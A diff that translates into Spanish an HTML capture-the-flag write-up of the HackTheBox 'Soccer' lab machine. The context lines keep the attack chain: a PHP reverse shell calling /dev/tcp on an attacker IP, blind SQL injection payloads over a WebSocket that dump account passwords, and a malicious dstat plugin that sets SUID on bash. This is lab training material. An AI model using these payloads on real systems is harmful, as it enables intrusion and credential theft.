@@ -140,7 +140,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -308,23 +308,24 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>soccer</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>Soccer</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Linux · Tiny File Manager RCE (CVE-2021-45010) → Blind SQLi vía WebSockets → doas + dstat → ROOT</p>
+    <p class="writeup-subtitle">HackTheBox — Linux · Tiny File Manager RCE (CVE-2021-45010) → SQLi ciega vía WebSockets → doas + dstat → ROOT</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
@@ -332,7 +333,7 @@
       <span class="meta-badge badge-cve">CVE-2021-45010</span>
       <span class="meta-badge badge-sqli">BLIND SQLI</span>
       <span class="meta-badge badge-shell">WEBSOCKETS</span>
-      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Junio 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -350,7 +351,7 @@
         <li><a href="#tfm">03 · Tiny File Manager</a></li>
         <li><a href="#foothold">04 · Foothold (RCE)</a></li>
         <li><a href="#pivote">05 · Pivote: vhost</a></li>
-        <li><a href="#sqli">06 · Blind SQLi (WS)</a></li>
+        <li><a href="#sqli">06 · SQLi ciega (WS)</a></li>
         <li><a href="#user">07 · Acceso como player</a></li>
         <li><a href="#privesc">08 · Escalada a Root</a></li>
         <li><a href="#flags">09 · Flags</a></li>
@@ -363,24 +364,24 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.4.0</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.4.0</span></div>
       <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2021-45010</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 22, 80</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Tiny File Manager</span> → creds por defecto</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Tiny File Manager</span> → credenciales por defecto</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2021-45010</span> → RCE como www-data</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nginx sites-available</span> → vhost soc-player</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>WebSocket /check</span> → Blind SQLi</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>WebSocket /check</span> → SQLi ciega</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>soccer_db.accounts</span> → creds player</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>soccer_db.accounts</span> → credenciales player</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>su player</span> → user.txt</div></div>
         <div class="ap-line"></div>
@@ -445,7 +446,7 @@
           <tr><td>RCE</td><td>CVE-2021-45010 — upload de webshell PHP</td><td>Reverse shell como www-data</td></tr>
           <tr><td>Post-explot.</td><td>/etc/nginx/sites-available/soc-player.htb</td><td>vhost soc-player.soccer.htb descubierto</td></tr>
           <tr><td>Enum. Web 2</td><td>feroxbuster soc-player.soccer.htb</td><td>Rutas /login, /signup, /check</td></tr>
-          <tr><td>Inyección</td><td>Blind SQLi vía WebSocket (puerto 9091)</td><td>Dump de soccer_db.accounts</td></tr>
+          <tr><td>Inyección</td><td>SQLi ciega vía WebSocket (puerto 9091)</td><td>Dump de soccer_db.accounts</td></tr>
           <tr><td>Movimiento lateral</td><td>Password reuse — su player</td><td>Shell como player + user.txt</td></tr>
           <tr><td>Enum. Privesc</td><td>find / -perm -4000 / doas.conf</td><td>doas permite dstat sin password</td></tr>
           <tr><td>Privesc</td><td>Plugin malicioso dstat_evil.py (GTFOBins)</td><td>chmod +s /bin/bash</td></tr>
@@ -476,7 +477,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.4.0 -oX soccer.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.4.0</span> <span class="flag">-oX</span> <span class="arg">soccer.xml</span></span></div>
       </div>
@@ -501,13 +502,13 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl soccer.xml > soccer.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">soccer.xml</span> &gt; <span class="arg">soccer.html</span></span></div>
       </div>
 
       <div class="cmd-block" data-cmd="echo '10.129.4.0    soccer.htb' | sudo tee -a /etc/hosts">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HOSTS</span>
         <div><span class="prompt">$ </span><span class="cmd">echo <span class="arg">'10.129.4.0    soccer.htb'</span> | sudo tee -a /etc/hosts</span></div>
       </div>
@@ -530,7 +531,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="feroxbuster --url http://soccer.htb">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FEROXBUSTER</span>
         <div><span class="prompt">$ </span><span class="cmd">feroxbuster <span class="flag">--url</span> <span class="arg">http://soccer.htb</span></span></div>
       </div>
@@ -600,7 +601,7 @@
       <div class="cmd-block" data-cmd="&lt;?php
 exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'&quot;);
 ?&gt;">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">REVERSHELL.PHP</span>
         <div><span class="comment">// revershell.php — code completo</span></div>
         <div><span class="cmd">&lt;?php</span></div>
@@ -613,7 +614,7 @@ exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'&
       </div>
 
       <div class="cmd-block" data-cmd="http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">URL</span>
         <div><span class="prompt">$ </span><span class="cmd">http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&amp;upload</span></div>
       </div>
@@ -627,7 +628,7 @@ exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'&
       </div>
 
       <div class="cmd-block" data-cmd="sudo nc -lvnp 443">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NETCAT</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
       </div>
@@ -661,13 +662,13 @@ exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'&
       </div>
 
       <div class="cmd-block" data-cmd='find / -type d -name "nginx" 2>/dev/null'>
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FIND</span>
         <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-type d -name</span> <span class="arg">"nginx"</span> 2&gt;/dev/null</span></div>
       </div>
 
       <div class="cmd-block" data-cmd="cat /etc/nginx/sites-available/soc-player.htb">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CAT</span>
         <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/etc/nginx/sites-available/soc-player.htb</span></span></div>
       </div>
@@ -691,13 +692,13 @@ exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'&
       </div>
 
       <div class="cmd-block" data-cmd="echo '10.129.4.0    soccer.htb soc-player.soccer.htb' | sudo tee -a /etc/hosts">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HOSTS</span>
         <div><span class="prompt">$ </span><span class="cmd">echo <span class="arg">'10.129.4.0    soccer.htb soc-player.soccer.htb'</span> | sudo tee -a /etc/hosts</span></div>
       </div>
 
       <div class="cmd-block" data-cmd="feroxbuster -u http://soc-player.soccer.htb/ -C 302 -N 50 -W 200 -S 2000">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FEROXBUSTER</span>
         <div><span class="prompt">$ </span><span class="cmd">feroxbuster <span class="flag">-u</span> <span class="arg">http://soc-player.soccer.htb/</span> <span class="flag">-C 302 -N 50 -W 200 -S 2000</span></span></div>
       </div>
@@ -720,7 +721,7 @@ exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'&
     <!-- SQLi -->
     <div class="section" id="sqli">
       <p class="section-label">// 06</p>
-      <h2 class="section-title">Blind SQL Injection vía WebSockets</h2>
+      <h2 class="section-title">Blind Inyección SQL vía WebSockets</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -793,7 +794,7 @@ def makeRequest():
 
 if __name__ == &quot;__main__&quot;:
     makeRequest()">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLI.PY — v1</span>
         <div><span class="comment"># sqli.py — script completo (enumeración de bases de datos)</span></div>
         <div><span class="cmd">import websocket</span></div>
@@ -876,7 +877,7 @@ if __name__ == &quot;__main__&quot;:
 payload = {
     &quot;id&quot;: &quot;1 or substr((select group_concat(table_name) from information_schema.tables where table_schema='soccer_db'),%d,1)='%s' &quot; % (i, character)
 }">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DIFF — v2</span>
         <div><span class="comment"># Cambios sobre sqli.py para listar tablas</span></div>
         <div><span class="cmd">p2 = log.progress(<span class="arg">"Tables Name [soccer_db]"</span>)</span></div>
@@ -902,7 +903,7 @@ payload = {
 payload = {
     &quot;id&quot;: &quot;1 or substr((select group_concat(column_name) from information_schema.columns where table_schema='soccer_db' and table_name='accounts'),%d,1)='%s' &quot; % (i, character)
 }">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DIFF — v3</span>
         <div><span class="comment"># Cambios sobre sqli.py para listar columnas de "accounts"</span></div>
         <div><span class="cmd">p2 = log.progress(<span class="arg">"Columns Name [soccer_db]"</span>)</span></div>
@@ -928,7 +929,7 @@ payload = {
 payload = {
     &quot;id&quot;: &quot;1 or binary substr((select group_concat(username,':',password) from soccer_db.accounts),%d,1)='%s' &quot; % (i, character)
 }">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DIFF — v4 (FINAL)</span>
         <div><span class="comment"># Cambios sobre sqli.py para extraer usuario:contraseña</span></div>
         <div><span class="cmd">characters = string.ascii_letters + string.digits + <span class="arg">"-_,:@;!"</span></span></div>
@@ -973,7 +974,7 @@ payload = {
       </div>
 
       <div class="cmd-block" data-cmd="su player">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SU</span>
         <div><span class="prompt">$ </span><span class="cmd">su <span class="arg">player</span></span></div>
       </div>
@@ -987,7 +988,7 @@ payload = {
       </div>
 
       <div class="cmd-block" data-cmd='python3 -c &#39;import pty; pty.spawn("/bin/bash")&#39;'>
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PTY</span>
         <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-c</span> <span class="arg">'import pty; pty.spawn("/bin/bash")'</span></span></div>
       </div>
@@ -1005,7 +1006,7 @@ payload = {
       </div>
 
       <div class="cmd-block" data-cmd="cat /home/player/user.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FLAG</span>
         <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/home/player/user.txt</span></span></div>
       </div>
@@ -1029,7 +1030,7 @@ payload = {
       </div>
 
       <div class="cmd-block" data-cmd="find / -perm -4000 -type f 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FIND</span>
         <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-perm -4000 -type f</span> 2&gt;/dev/null</span></div>
       </div>
@@ -1050,13 +1051,13 @@ payload = {
       </div>
 
       <div class="cmd-block" data-cmd="find / -name doas.conf 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FIND</span>
         <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-name</span> <span class="arg">doas.conf</span> 2&gt;/dev/null</span></div>
       </div>
 
       <div class="cmd-block" data-cmd="cat /usr/local/etc/doas.conf">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CAT</span>
         <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/usr/local/etc/doas.conf</span></span></div>
       </div>
@@ -1084,7 +1085,7 @@ payload = {
       </div>
 
       <div class="cmd-block" data-cmd="ls -l /usr/local/share | grep dstat">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LS</span>
         <div><span class="prompt">$ </span><span class="cmd">ls <span class="flag">-l</span> /usr/local/share | grep <span class="arg">dstat</span></span></div>
       </div>
@@ -1097,7 +1098,7 @@ payload = {
 import os
 os.system('chmod +s /bin/bash')
 EOF">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PLUGIN</span>
         <div><span class="prompt">$ </span><span class="cmd">cat &gt; /usr/local/share/dstat/dstat_evil.py &lt;&lt; <span class="arg">'EOF'</span></span></div>
         <div><span class="cmd">import os</span></div>
@@ -1127,7 +1128,7 @@ EOF">
       </div>
 
       <div class="cmd-block" data-cmd="/usr/local/bin/doas /usr/bin/dstat --evil">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DOAS</span>
         <div><span class="prompt">$ </span><span class="cmd">/usr/local/bin/doas /usr/bin/dstat <span class="flag">--evil</span></span></div>
       </div>
@@ -1143,7 +1144,7 @@ EOF">
       </div>
 
       <div class="cmd-block" data-cmd="/bin/bash -p">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SHELL</span>
         <div><span class="prompt-root"># </span><span class="cmd">/bin/bash <span class="flag">-p</span></span></div>
       </div>
@@ -1156,8 +1157,8 @@ EOF">
       </div>
 
       <div class="cred-box">
-        <div class="cred-item"><div class="cred-label">USER FLAG</div><div class="cred-val">127698292315b1fdd9c6f80da441ab5f</div></div>
-        <div class="cred-item"><div class="cred-label">ROOT FLAG</div><div class="cred-val">7e7cd69f31652f074464b1c21a6ba54d</div></div>
+        <div class="cred-item"><div class="cred-label">BANDERA DE USUARIO</div><div class="cred-val">127698292315b1fdd9c6f80da441ab5f</div></div>
+        <div class="cred-item"><div class="cred-label">BANDERA DE ROOT</div><div class="cred-val">7e7cd69f31652f074464b1c21a6ba54d</div></div>
       </div>
     </div>
 
@@ -1220,12 +1221,12 @@ EOF">
       <div class="glosario-grid">
 
         <div class="glos-card">
-          <div class="glos-term">Default Credentials (Credenciales por Defecto)</div>
+          <div class="glos-term">Credenciales por defecto (Credenciales por defecto)</div>
           <div class="glos-def">Son las credenciales preconfiguradas de fábrica en un software, documentadas públicamente por el propio desarrollador para facilitar la instalación inicial. El problema surge cuando el administrador nunca las cambia tras desplegar la aplicación, dejando una puerta de entrada trivial para cualquier atacante que conozca o busque esa documentación.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">CVE-2021-45010 — Tiny File Manager Arbitrary File Upload</div>
+          <div class="glos-term">CVE-2021-45010 — Tiny File Manager Arbitrary Subida de archivos</div>
           <div class="glos-def">Vulnerabilidad en <strong>Tiny File Manager &lt;= 2.4.3</strong> que permite a un usuario autenticado subir archivos sin validar su extensión. Al permitir subir un archivo <code>.php</code> dentro del webroot, un atacante puede ejecutar código arbitrario en el servidor simplemente visitando la URL del archivo subido.</div>
         </div>
 
@@ -1235,7 +1236,7 @@ EOF">
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Blind SQL Injection</div>
+          <div class="glos-term">Blind Inyección SQL</div>
           <div class="glos-def">Tipo de inyección SQL en la que la aplicación <strong>no devuelve directamente</strong> los datos extraídos de la base de datos. En su lugar, el atacante infiere información observando diferencias de comportamiento — un mensaje distinto, un cambio en el tiempo de respuesta, o un código de estado diferente — al variar la condición lógica inyectada (por ejemplo, <code>substr(...)='a'</code>, <code>='b'</code>, etc., carácter por carácter).</div>
         </div>
 
@@ -1287,9 +1288,9 @@ EOF">
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Soccer · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
